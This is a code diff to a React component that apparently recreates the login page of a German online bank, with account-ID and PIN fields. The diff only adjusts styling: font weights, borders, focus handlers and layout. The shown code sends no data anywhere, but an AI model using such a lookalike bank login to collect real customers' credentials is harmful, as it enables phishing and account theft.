@@ -95,7 +95,7 @@ const Direkt1822 = () => {
         {/* Main */}
         <main className="flex-1" style={{ background: PAGE_BG }}>
           <div style={{ maxWidth: 1200, margin: "0 auto", padding: "48px 40px 72px", position: "relative" }}>
-            <h1 style={{ color: NAVY, fontSize: 36, fontWeight: 600, letterSpacing: "-0.01em" }}>
+            <h1 style={{ color: NAVY, fontSize: 36, fontWeight: 200, letterSpacing: "-0.01em" }}>
               Online-Banking<span style={{ color: RED }}>.</span>
             </h1>
 
@@ -114,12 +114,12 @@ const Direkt1822 = () => {
             <div style={{ display: "flex", alignItems: "center", gap: 20, marginTop: 48, marginBottom: 20 }}>
               <h2 style={{ color: NAVY, fontSize: 20, fontWeight: 700 }}>Anmeldung</h2>
               <a href={URLS.help} target="_blank" rel="noopener noreferrer"
-                style={{ color: NAVY, fontSize: 15, textDecoration: "underline", textUnderlineOffset: 3 }}>
+                style={{ color: NAVY, fontSize: 15, fontWeight: 700, textDecoration: "underline", textUnderlineOffset: 3 }}>
                 Benötigen Sie Hilfe?
               </a>
             </div>
 
-            <div className="grid grid-cols-1 lg:grid-cols-2" style={{ gap: 40 }}>
+            <div className="grid grid-cols-1 lg:grid-cols-2" style={{ gap: 40, alignItems: "start" }}>
               {/* Login card */}
               <section style={{ background: CARD, padding: "32px 40px 40px", boxShadow: "0 2px 4px rgba(0,56,106,.04)" }}>
                 <form onSubmit={handleSubmit} noValidate autoComplete="off">
@@ -128,9 +128,7 @@ const Direkt1822 = () => {
                   </label>
                   <input id="k" type="text" value={kennung} onChange={(e) => setKennung(e.target.value)}
                     autoComplete="off"
-                    style={{ width: "100%", background: INPUT_BG, border: `1px solid ${BORDER}`, borderRadius: 2, padding: "14px 14px", fontSize: 16, outline: "none", fontFamily: "inherit", color: TEXT }}
-                    onFocus={(e) => { e.currentTarget.style.borderColor = NAVY; }}
-                    onBlur={(e) => { e.currentTarget.style.borderColor = BORDER; }} />
+                    style={{ width: "100%", background: INPUT_BG, border: `1px solid ${NAVY}`, borderRadius: 2, padding: "14px 14px", fontSize: 16, outline: "none", fontFamily: "inherit", color: TEXT }} />
                   <div style={{ marginTop: 12, display: "flex", gap: 24, flexWrap: "wrap" }}>
                     <a href={URLS.forgotId} target="_blank" rel="noopener noreferrer" style={{ color: NAVY, fontSize: 14, textDecoration: "underline", textUnderlineOffset: 3 }}>Online-Kennung vergessen?</a>
                     <a href={URLS.newBanking} target="_blank" rel="noopener noreferrer" style={{ color: NAVY, fontSize: 14, textDecoration: "underline", textUnderlineOffset: 3 }}>Neu im Online-Banking?</a>
@@ -139,17 +137,15 @@ const Direkt1822 = () => {
                   <label htmlFor="p" style={{ display: "block", color: NAVY, fontWeight: 700, fontSize: 15, marginTop: 28, marginBottom: 10 }}>
                     Online-PIN<InfoDot title="Ihre persönliche Online-PIN" />
                   </label>
-                  <div style={{ position: "relative", display: "flex", alignItems: "stretch", background: INPUT_BG, border: `1px solid ${BORDER}`, borderRadius: 2 }}
-                    onFocus={(e) => { (e.currentTarget as HTMLDivElement).style.borderColor = NAVY; }}
-                    onBlur={(e) => { (e.currentTarget as HTMLDivElement).style.borderColor = BORDER; }}>
+                  <div style={{ position: "relative", display: "flex", alignItems: "stretch", background: INPUT_BG, border: `1px solid ${NAVY}`, borderRadius: 2 }}>
                     <input id="p" type={showPin ? "text" : "password"} value={pin} onChange={(e) => setPin(e.target.value)}
                       autoComplete="off"
                       style={{ flex: 1, background: "transparent", border: "none", padding: "14px 14px", fontSize: 16, outline: "none", fontFamily: "inherit", color: TEXT, minWidth: 0 }} />
                     <button type="button" aria-label={showPin ? "PIN verbergen" : "PIN anzeigen"} onClick={() => setShowPin((v) => !v)}
-                      style={{ padding: "0 12px", color: NAVY, borderLeft: `1px solid ${BORDER}`, display: "flex", alignItems: "center" }}>
+                      style={{ padding: "0 12px", color: NAVY, borderLeft: `1px solid ${NAVY}`, display: "flex", alignItems: "center" }}>
                       {showPin ? <EyeOff size={20} /> : <Eye size={20} />}
                     </button>
-                    <span aria-hidden="true" style={{ padding: "0 12px", color: NAVY, borderLeft: `1px solid ${BORDER}`, display: "flex", alignItems: "center" }}>
+                    <span aria-hidden="true" style={{ padding: "0 12px", color: NAVY, borderLeft: `1px solid ${NAVY}`, display: "flex", alignItems: "center" }}>
                       <Keyboard size={20} />
                     </span>
                   </div>
